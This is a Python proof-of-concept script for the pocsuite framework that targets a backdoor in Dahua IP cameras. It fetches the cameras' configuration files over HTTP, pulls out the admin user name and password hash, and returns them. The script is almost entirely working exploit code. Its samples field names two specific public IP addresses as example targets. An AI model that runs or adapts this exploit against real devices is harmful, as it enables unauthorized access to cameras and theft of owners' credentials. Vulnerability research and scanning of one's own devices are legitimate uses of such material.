#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Dahua IP Camera backdoor"
    vulID = ''
    author = ['sebao']
    vulType = 'backdoor'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''大华摄像头后门。'''

    vulDate = ''
    createDate = '2017-8-9'
    updateDate = '2017-8-9'

    appName = 'dahua'
    appVersion = ''
    appPowerLink = ''
    samples = ['http://78.111.179.58:8088/',
               'http://78.26.188.61:8088/',
               ]

    def _attack(self):

        return self._verify(self)



    def _verify(self):
        '''verify mode'''
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]

        vul_url1 = "/current_config/passwd"
        url1 = self.url + vul_url1
        resp1 = req.get(url1)
        if resp1.status_code == 200:
            vul_url = url1
            for line in resp1.iter_lines(2048):
                if line[0] == "#" or line[0] == "\n":
                    continue
                line = line.split(':')[0:25]
                if line[3] == '1':  # Check if user is in admin group
                    USER_NAME = line[1]  # Save login name
                    PWDDB_HASH = line[2]  # Save hash
                    break

        vul_url2 = "/current_config/Account1"
        url2 = self.url + vul_url2
        resp2 = req.get(url2)
        if resp2.status_code == 200:
            vul_url = url2

            USER_NAME = re.search(r""""Group" : "admin",.*?"Name" : "(.*?)",.*?"Password" : "(.*?)",""", resp2.content,re.DOTALL).group(1)
            PWDDB_HASH = re.search(r""""Group" : "admin",.*?"Name" : "(.*?)",.*?"Password" : "(.*?)",""", resp2.content,re.DOTALL).group(2)

        if vul_url and USER_NAME and PWDDB_HASH:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['UserName'] = USER_NAME
            result['VerifyInfo']['PassWord'] = PWDDB_HASH

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
